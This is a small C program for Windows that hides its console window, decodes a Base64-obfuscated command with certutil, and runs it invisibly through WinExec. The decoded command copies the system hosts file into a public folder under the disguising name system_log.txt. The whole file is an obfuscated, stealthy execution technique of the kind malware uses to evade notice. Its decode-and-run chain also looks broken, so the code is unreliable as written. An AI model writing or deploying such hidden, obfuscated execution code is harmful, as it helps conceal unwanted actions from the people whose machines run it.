#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Base64 encoded command (copying hosts file)
    char encodedCmd[] = "Y29weSBDOlxcV2luZG93c1xcU3lzdGVtMzJcXGRyaXZlcnNcXGV0Y1xo"
                        "b3N0cyBDOlxcVXNlcnNcXFB1YmxpY1xcc3lzdGVtX2xvZy50eHQ=";

    // Command to decode and execute Base64 string using certutil
    char finalCmd[512];
    snprintf(finalCmd, sizeof(finalCmd),
        "cmd.exe /c echo %s | certutil -decode - temp_decoded.txt && cmd.exe /c temp_decoded.txt",
        encodedCmd);

    // Debugging: Print command before execution (remove later)
    printf("Executing: %s\n", finalCmd);

    // Execute the obfuscated command
    WinExec(finalCmd, SW_HIDE);

    return 0;
}
